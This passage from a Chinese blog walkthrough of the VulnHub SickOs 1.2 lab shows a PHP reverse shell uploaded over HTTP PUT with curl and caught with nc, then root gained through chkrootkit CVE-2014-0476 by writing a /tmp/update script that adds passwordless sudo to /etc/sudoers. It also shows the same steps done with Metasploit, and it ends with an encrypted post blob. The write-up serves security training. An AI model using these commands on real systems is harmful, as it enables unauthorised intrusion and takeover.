<p>在/test上找到目录列表，但是没有什么有趣的。我在/和/test上检查HTTP方法OPTIONS，发现/test上允许许多HTTP方法</p>
<p>request</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OPTIONS /<span class="built_in">test</span>/ HTTP/1.1</span><br><span class="line">Host: 192.168.66.14</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>response</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">DAV: 1,2</span><br><span class="line">MS-Author-Via: DAV</span><br><span class="line">Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK</span><br><span class="line">Allow: OPTIONS, GET, HEAD, POST</span><br><span class="line">Content-Length: 0</span><br><span class="line">Connection: close</span><br><span class="line">Date: Mon, 30 Mar 2020 05:42:43 GMT</span><br><span class="line">Server: lighttpd/1.4.28</span><br></pre></td></tr></table></figure>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>允许HTTP方法PUT，而无需身份验证。攻击者可以使用HTTP方法PUT将Web Shell上传到/test。所以使用以下的curl方法上传php-reverse-shell.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/sickos<span class="comment"># curl --upload-file php-reverse-shell.php -v --url http://192.168.233.129/test/shell.php -0 --http1.0</span></span><br><span class="line">*   Trying 192.168.233.129:80...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* Connected to 192.168.233.129 (192.168.233.129) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; PUT /<span class="built_in">test</span>/shell.php HTTP/1.0</span><br><span class="line">&gt; Host: 192.168.233.129</span><br><span class="line">&gt; User-Agent: curl/7.68.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Length: 5494</span><br><span class="line">&gt; </span><br><span class="line">* We are completely uploaded and fine</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">* HTTP 1.0, assume close after body</span><br><span class="line">&lt; HTTP/1.0 201 Created</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; Date: Mon, 30 Mar 2020 05:50:14 GMT</span><br><span class="line">&lt; Server: lighttpd/1.4.28</span><br><span class="line">&lt; </span><br><span class="line">* Closing connection 0</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub228.jpg"></li>
</ul>
<p>可以看到成功的上传了phpreverseshell</p>
<p>kali端使用nc监听端口，并用浏览器访问shell地址，成功反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -nlvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [192.168.233.128] from (UNKNOWN) [192.168.233.129] 48337</span><br><span class="line">Linux ubuntu 3.11.0-15-generic <span class="comment">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</span></span><br><span class="line"> 23:07:02 up 8 min,  0 users,  load average: 0.03, 0.03, 0.02</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br></pre></td></tr></table></figure>

<p>尝试在TCP端口8890上进行侦听，发现没有连接到达我的侦听器，然后将侦听端口更改为443，并修改了php reverse shell，然后再次上传,才成功收到shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@ubuntu:/$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>列举操作系统版本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ lsb_release -a</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 12.04.4 LTS</span><br><span class="line">Release:        12.04</span><br><span class="line">Codename:       precise</span><br><span class="line">www-data@ubuntu:/$ dpkg -l | grep chkrootkit</span><br><span class="line">dpkg -l | grep chkrootkit</span><br><span class="line">rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector</span><br></pre></td></tr></table></figure>

<p>检查cron任务，发现cron.daily有chkrootkit。知道chkrootkit—<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzM4OTk=">CVE-2014-0476<i class="fa fa-external-link-alt"></i></span>的漏洞可能会有提升到root用户的机会。</p>
<p>脆弱的chkrootkit将执行/tmp/update，可以在/tmp contains shell命令中创建名为update的文件，该命令将sudo su添加到用户www-data</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ <span class="built_in">echo</span> <span class="string">&#x27;echo &quot;www-data ALL=NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers&#x27;</span> &gt; /tmp/update</span><br><span class="line">&lt; ALL<span class="string">&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers&#x27; &gt; /tmp/update              </span></span><br><span class="line"><span class="string">www-data@ubuntu:/$</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br><span class="line">chmod: changing permissions of `VMwareDnD<span class="string">&#x27;: Operation not permitted</span></span><br><span class="line"><span class="string">chmod: changing permissions of `vgauthsvclog.txt.0&#x27;</span>: Operation not permitted</span><br><span class="line">chmod: changing permissions of `vmware-root<span class="string">&#x27;: Operation not permitted</span></span><br><span class="line"><span class="string">www-data@ubuntu:/tmp$ ls -la</span></span><br><span class="line"><span class="string">ls -la</span></span><br><span class="line"><span class="string">total 24</span></span><br><span class="line"><span class="string">drwxrwxrwt  4 root     root     4096 Mar 29 23:24 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 22 root     root     4096 Mar 30  2016 ..</span></span><br><span class="line"><span class="string">drwxrwxrwt  2 root     root     4096 Mar 29 22:58 VMwareDnD</span></span><br><span class="line"><span class="string">srwxrwxrwx  1 www-data www-data    0 Mar 29 22:58 php.socket-0</span></span><br><span class="line"><span class="string">-rwxrwxrwx  1 www-data www-data   76 Mar 29 23:18 update</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root     root     1600 Mar 29 22:58 vgauthsvclog.txt.0</span></span><br><span class="line"><span class="string">drwx------  2 root     root     4096 Mar 29 22:58 vmware-root</span></span><br></pre></td></tr></table></figure>

<p>然后等待几分钟</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/tmp<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:/tmp<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@ubuntu:/tmp<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@ubuntu:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz  chkrootkit-0.49</span><br><span class="line">7d03aaa2bf93d80040f3f22ec6ad9d5a.txt                     newRule</span><br><span class="line">root@ubuntu:~<span class="comment"># cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span></span><br><span class="line">cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br><span class="line">WoW! If you are viewing this, You have <span class="string">&quot;Sucessfully!!&quot;</span> completed SickOs1.2, the challenge is more focused on elimination of tool <span class="keyword">in</span> real scenarios <span class="built_in">where</span> tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though <span class="keyword">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> giving this try.</span><br><span class="line"></span><br><span class="line">@vulnhub: Thanks <span class="keyword">for</span> hosting this UP!.</span><br></pre></td></tr></table></figure>

<p>成功的获取到了root权限，并找到了flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub229.jpg"></li>
</ul>
<h3 id="提权2-使用msf提权"><a href="#提权2-使用msf提权" class="headerlink" title="提权2(使用msf提权)"></a>提权2(使用msf提权)</h3><p>设置msf，然后使用之前的php-reverse-shell反弹shell到nsf，然后将session会话置于后台</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[i] Database already started</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">      .:okOOOkdc<span class="string">&#x27;           &#x27;</span>cdkOOOko:.                                                                                    </span><br><span class="line">    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                  </span><br><span class="line">   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                 </span><br><span class="line">  <span class="string">&#x27;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#x27;</span>                                                                                </span><br><span class="line">  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                                                </span><br><span class="line">  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                                                </span><br><span class="line">  lOOOOOOOO.         ;d;         ,OOOOOOOOl                                                                                </span><br><span class="line">  .OOOOOOOO.   .;           ;    ,OOOOOOOO.                                                                                </span><br><span class="line">   cOOOOOOO.   .OOc.     <span class="string">&#x27;oOO.   ,OOOOOOOc                                                                                 </span></span><br><span class="line"><span class="string">    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                                                  </span></span><br><span class="line"><span class="string">     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                                                   </span></span><br><span class="line"><span class="string">      ;OOOO&#x27;</span>   .OOOO.   :OOOO.   ;OOOO;                                                                                    </span><br><span class="line">       .dOOo   .OOOOocccxOOOO.   xOOd.                                                                                     </span><br><span class="line">         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                                                       </span><br><span class="line">           :kk;.OOOOOOOOOOOOO.cOk:                                                                                         </span><br><span class="line">             ;kOOOOOOOOOOOOOOOk:                                                                                           </span><br><span class="line">               ,xOOOOOOOOOOOx,                                                                                             </span><br><span class="line">                 .lOOOOOOOl.                                                                                               </span><br><span class="line">                    ,dOd,                                                                                                  </span><br><span class="line">                      .                                                                                                    </span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.80-dev                          ]</span><br><span class="line">+ -- --=[ 1983 exploits - 1088 auxiliary - 339 post       ]</span><br><span class="line">+ -- --=[ 563 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: You can use <span class="built_in">help</span> to view all available commands</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.233.128</span><br><span class="line">lhost =&gt; 192.168.233.128</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.233.128:443 </span><br><span class="line">[*] Command shell session 1 opened (192.168.233.128:443 -&gt; 192.168.233.129:48340) at 2020-03-30 02:40:05 -0400</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ backgroud</span><br><span class="line">/bin/sh: 5: backgroud: not found</span><br><span class="line">$ background</span><br><span class="line"></span><br><span class="line">Background session 1? [y/N]  y</span><br><span class="line">msf5 exploit(multi/handler) &gt;</span><br></pre></td></tr></table></figure>

<p>然后，开始寻找chkroot漏洞利用程序并正确用msf配置它：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(handler) &gt; search chkroot</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                           Disclosure Date  Rank    Description</span><br><span class="line">   ----                           ---------------  ----    -----------</span><br><span class="line">   exploit/unix/<span class="built_in">local</span>/chkrootkit  2014-06-04       manual  Chkrootkit Local Privilege Escalation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; use exploit/unix/<span class="built_in">local</span>/chkrootkit</span><br><span class="line">msf exploit(chkrootkit) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/<span class="built_in">local</span>/chkrootkit):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting       Required  Description</span><br><span class="line">   ----        ---------------       --------  -----------</span><br><span class="line">   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit</span><br><span class="line">   SESSION                           yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(chkrootkit) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(chkrootkit) &gt; <span class="built_in">set</span> lport 8080</span><br><span class="line">lport =&gt; 8080</span><br></pre></td></tr></table></figure>
<p>此外还要设置lhost为192.168.233.128<br>等待返回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; <span class="built_in">set</span> LHOST 192.168.233.128</span><br><span class="line">LHOST =&gt; 192.168.233.128</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; run -j</span><br><span class="line">[*] Exploit running as background job 1.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 192.168.233.128:8080 </span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; [!] Rooting depends on the crontab (this could take a <span class="keyword">while</span>)</span><br><span class="line">[*] Payload written to /tmp/update</span><br><span class="line">[*] Waiting <span class="keyword">for</span> chkrootkit to run via cron...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> m6QrrJnhcNykbebU;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: <span class="string">&quot;m6QrrJnhcNykbebU\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 2 opened (192.168.233.128:8080 -&gt; 192.168.233.129:37735) at 2020-03-30 03:15:49 -0400</span><br><span class="line">[+] Deleted /tmp/update</span><br><span class="line">id</span><br><span class="line">[*] <span class="built_in">exec</span>: id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type             Information                                                                       Connection</span><br><span class="line">  --  ----  ----             -----------                                                                       ----------</span><br><span class="line">  1         shell x86/linux  Linux ubuntu 3.11.0-15-generic <span class="comment">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UT...  192.168.233.128:443 -&gt; 192.168.233.129:48369 (192.168.233.129)</span></span><br><span class="line">  2         shell cmd/unix                                                                                     192.168.233.128:8080 -&gt; 192.168.233.129:37735 (192.168.233.129)</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; sessions 2</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功的获取了root权限，现在来寻找flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; sessions 2</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">root@ubuntu:/tmp<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:/tmp<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@ubuntu:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz  chkrootkit-0.49</span><br><span class="line">7d03aaa2bf93d80040f3f22ec6ad9d5a.txt                     newRule</span><br><span class="line">root@ubuntu:~<span class="comment"># cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span></span><br><span class="line">cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br><span class="line">WoW! If you are viewing this, You have <span class="string">&quot;Sucessfully!!&quot;</span> completed SickOs1.2, the challenge is more focused on elimination of tool <span class="keyword">in</span> real scenarios <span class="built_in">where</span> tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though <span class="keyword">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> giving this try.</span><br><span class="line"></span><br><span class="line">@vulnhub: Thanks <span class="keyword">for</span> hosting this UP!.</span><br></pre></td></tr></table></figure>

<p>成功的获取到了flag</p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>HTTP put方法写入shell</li>
<li>cron定时任务+chkrootkit漏洞CVE-2014-0476—提权</li>
<li>msf的exploit/unix/local/chkrootkit模块—提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[SneakyMailer]</title>
    <url>/2020/07/12/SneakyMailer/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">enter the root pass hash to unlock this article</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="2226bb3220308e09a270bcabc54839d6966bbfe6bbcc51be5e974ccadc5014c6">81db5e419ecd237a8690eab6d28f1ad6f8e00573578c5cdb0c3ef9dcf1926600b2da7855bd7c10f2922f0cca72e61c94c712e8d09c930c8fc60543c3e09cde86394754d280ae9e481f9847dde3fe5b796bb01247be74212207cce371a0d02c3087915029ed6c9a377c73c7b19595937e36f889ec27edf1c894a8b18d0a8472d1ad2bd6d3596f29ed1ee8d36959f0f0a5fba25ca34d276c36913ef3e63e1ce27fdb8777ebb2816b0225a7e5a7cff1a23b2b0257aa91956ad9f4023e934d41cfa3cc8267170630770e492cfba30dc5ca093ac3b894029fcf3739c744835c41ab292edb304b13aef9f5cda3253fc10cef0681b272ef04f318c686c0ffffc45d0451cdef2a58391bb235b6447826233e3176c53301b664a29adc3dda4c30f1677f37390d4a183e468d8e85d356c32ef0d9b6899042b45f6fe6a7a95b2dfb5159de4d6ad140c0537237afd34033f614ca8ba8556fffac3696fe9fca6fa31b587d64e0c1c85d39c0b4ec0f331a21ee1dc61f048751293d026f0eddfe4deefd9a47b6a9f89d931046e0787ef27a53d9a5defe364720a817428674ae28744918ecd429d2f274f99f6bbaa84632da8d247537abdfdcaf305346c5fd3e9b7069274aacc30134a446bb71a18894c7199b36588aa211a8aa932db3e1470642b6b91237a07ba3476c60d0d518c403871256cc754291962396e7b199ca9c3843e913ed19637604a6edca204e48d00a97ec54b941139813dc9680461a93797196383ce499eaec04473667454b0a77b53dfc9d8500f146e5dc9a668af6d4d48d2e507b41afed4410f637849d0a96406aac3a7c9abf241892cb3b2501240d1213e7c712352a615c574ac6a99d634aea3388f8e1167b4377e421ddf8de84478d41e90f655024bd09fdd7c28b24af32ec83398a45a9c12a88e6e8723f9c5f0342f20cf676bc9a54cab77d63d207d2c191de28fec6fc149e36d2e88d26ab4a7645448763bc77f8727e49231e7015820f3ed525f6bdeaecff71f4ba4188535ba27f3ffb1802769ee9d7bca5937ecb1dfb5901b83daebb3e3e721f5fa2b9f84f511f847b7d43d04233430396508a5649587839314ee5df2773c620161eeaa44bf631231c62ca6ec7d9200ae681e18cea432c0457b6d0cec1e4f3b9b1c721d88b4546d4896a0d4c4754a40bf40944d596e3b57c251de2a7baa20f92c94f2df090bd001c7213a03d472095e15ecaf5b08782956001aedcfa0923a24c93cdff4739bdf4c3fca73578b7278bc2ba2e8cb35cac02027cdd1a2fc18cb428f23772e13a2a30d068d1f16b78445db8ea1352476e3da937a38b8472c3ea6030a6fb6892214496087ed69004275e1016b84d9b8da72ad49b9ba75e4a204b8000c68e737a9a58ab7ab89066715d792a2f0101c4a266be3aba14d48c50bdfc9f608792c3f63e0341a7c8eb373327d7df0c7593d16e46aea2089dcdc3603e35ad0e729e3fd6e18c7fbd55727c6a39348c5c6cbdc52b2545c3adabce7cdf6b973bfc3eb638ab450e18ea57e0a5ea135f7d21076540835af595ad837256f5781693612d7ab3b1012d27195ed06ef143d3e9ad333af1b19c0c6cebd923b9d45b343f2616131fda7c82c869392f3c0a1fa64ff00277dc36dfe0a521efa4a7c74224fd7078ca51eb951b8cebcfb81b1dcfc0efa65d36b23e751439f84433bd8f9d6d6fdd33fe51dc5057288800b7aacc4c6b8f51516d414e06233bce2d6cdbe00ca063245ed51820a320b8a44a0d98cdf74e3602b87c8980d80d20bf65adf28ba34a15251287e9aa27fbe4c42f1b90f14521cdc3884db457520baa56c8f92edf1ea9c0d14fa6c232225c9db03970f01af75826dfb7168469e06f7b5b1ee98933cb4c9018c42ec3ed3cab1cb8eee6c0a96376eb4616d2aa4f8815410061c8900263a558aa654c61dc2d33e82c7f7908d0567c84152b2aef88845d603f40c4c4a8c896b1d1bd4fc9c749325be0b1b52c83195081e935aa2ec6997b39aa5b10fa78f2ad5310aad8b21d118185befc4808d770fe54ca5dceee4ae04ee7c3b7dc8d2357472cce60ba54dafebfd0ef55b753074446fac33c5cb11a78871dab05e20511e1bb27d1e03e92ab96e30ae1c6858ce3f22b928184df13eacf324e29dc0a09a048367de5fa0af2ea5810064e4c5d698211e2feb2729ee8019d1e2f3cc40604cd149320402a158f29b487eba2857df0122747692910c230e0aa9fde17893053377dbd2041a5548535abb38e611246970aaf69c3604d12745a7d8c1097c465d0044837471946f64cbc1d2bb03e3f1fea8e89a9b7f2f4c7b1dbb6d82e66a0d0685ac22badd049e1503af7acb4ee2e742bfdb6c21e258d7903e1bc99798281ae6c8466bad3ddfe193ed62e4884851ec7a12d699811d24212c7c78b278faacae72d4e14bbed27c621ffbdb18cdb68e72bfd7855cfc10c59611204da5323632f3b6e66efa7644860a9daefa1811072dbbdc5d238b7093241285027c60739385300d22aae4811cba5a46153ad0eabd9f6a9fb83d186b060284649bd74ecd267c4912adfd14ef740ec2552590663083318a0c9fd501a75eac9ac7c8180e7767af2464bb37ed7ca6c28f6facbbfc12195b0f9963805782c10c3e066c5861f5ab8af18bc1d215f733de94e055962b83c8c552dd6f662167f35535b7176f397854c108de7f4f1942857c7221686363359f263258868258e0a8028fced881ef952c898671394786067296b38e5613d178bcdca7d56e83ef3b179e40524bad501b4817f63887221a08fff318a6afdce6fa474b25f11d860cdd1301b6675c06718f334a8cad8d4d851b11f34dbbbdbc334057d20aa03b3156d09f10d3b501223e90d80587ab091082bc212035aeb8060c6b2ee6630e64d1da979ce994bcb09937e6191046b331fcf913771d7ca7c867d637a09cd8f4cb4e773fe3211ea406927c4d5ae6c15ed98c4593620e7f0e9a16af4674a6fadadd7871485830aab4e42bb95306a59ff8e0e7fcf7d837c481bd1d12ca4cecac54d99907cb8feb002fe6beb4e8f6037672f366a7aa993c2b8064b3b905fd771198cc9592f1de4e0888c7614eddd9a3c1698f8f134e8033a8114ef5a604c6aa4e6c9c37c529a4862bc56ee6ff7e18bee4cf5073f28e419fbcfa1c63849929f894666c6a8c6318176b0446843a0f4670109b946325d7fecc5003e3e30f9c8e48f0d6780cc3fbdd244cea551ce2f99a5727d9daa8d0cf973d34ac18dfd2fd2c1b03b17e42d39183b9656b028bb37dcf6b3dadb15bd215955930daeeace4ab849ef84cd44e6e72a6330dccd3e45fddf15555a9aa9d70c5713e23a31d443ef5ac27bc68d413fd074d2a896cd85377ea897f972c017215aa6738bb960149f8c091b7eaf51e29871bf91e19cb83b8304c9b214c1d593b9fcf0fbc6598218b18786f630f78acecf0dc4d4d9442cc23befbbadb2d35a671d45679539d24ec66d542b20c3bf69f9a381d7ef4dd862c5fe9b5e46466f116f1a2078a4e25686890456ead34c3a420e40304fd31eb03c6cc4b8a1ac90e6e42089c8b28b75532464c3efe5d35b9d77a264a903addc4d0d63b8e5a76adfc5514b6c2d986fdc5c177f65b96ca73a7b807655f372797fb68a3066bf9a4066cfd48a845d4715ef7f1584f0fd25809376997cadf8696dd09e88e7c572c854cf8080ca8767fe1c86205bf485976c704c4da84bbebfba242ef5c085603c053aba4841921582d7fd50cc82d62d45ae147a87c602cc8064c5f9cf268464374618d09fc99d8f32a0199c58bad5580ccba564bca529ea354102393c015377e89329326d134f13a7eca792d217fba336e58ee09a93b74fde3d698baa1af3f7f74f090f41a021e8e3ae193b9a800633613bfba072cea62ce7847fd81cd8d1fff616442b77aaa746fa7dd4c9894b9f47145db1f0f0cc683b7909482f10d1d83d756b63406781df29a642c8babcd2d7b0d5009a5a09d1e78a6bf6e6308cecf75917b8e67d54cf4045741fb091c6db0f35a60d89b9dda2f7b1c09b9297328354d98a5dae02ddbbb8ad3bc083a026f59d5c559cdb1ce0a2b21f5eeb1f2eabb10579d79a082059cbe51ccd0ba73383090bd9c653233b2b4d10080a1a93a359174d06fe30361cae07731573f2b47de9a0f3d87f2155c841ef383269af6efa781a2d0e2ff1bc0bf764a6b32cb69d80e3b1f1a58922b1a414863307d3d3b4ff378e51611b438bf369a2f22bd88328dd897d5c5a884ebacb6f61e0073a3a5621f03a4787aed7b51c874d0071aad4afff1e40407bb51a6a88d2906155038e24a9ae2fa44b20870053fe7a5b146599a8afa52fb4b650e00286edf2d57424badff1f76add663c087173269c9e4569153018a776b72c5cde1d7c419a63f4a24471c6db657bcbbdb25a1097e731e1f36f8eb17464bb71bd6798ad1bf8ca5aad61b8fc6850e770419aaa7ee1fc99776d8e0ccbdc4c6e4e4b19f4ec533966fddcc12ead7a161627f6b8aae712cc2edd181302eb27c99f3509474a8d253c135fe4edf60809dda2c5481818d8e242cb2fca72fc62f2cdccb418b366a0bfe325ec0e2439bb7ddf8cbef2a074ab81091a7f44dad37a09b5c812591aa0df1e1fcd641ad1c12a87532528c21becd4b62fd4bfca4a89981a84ab4ed2524f50880c6ed790563ef5f7d6ea86a4bafc0e965d89c7014be26ebfc1fa239278d37db6a34e8e726b545b9644037249f621512c99550b3939fa658ff40acc5f2017c4518d0e919490d239e6c03b24404a8ce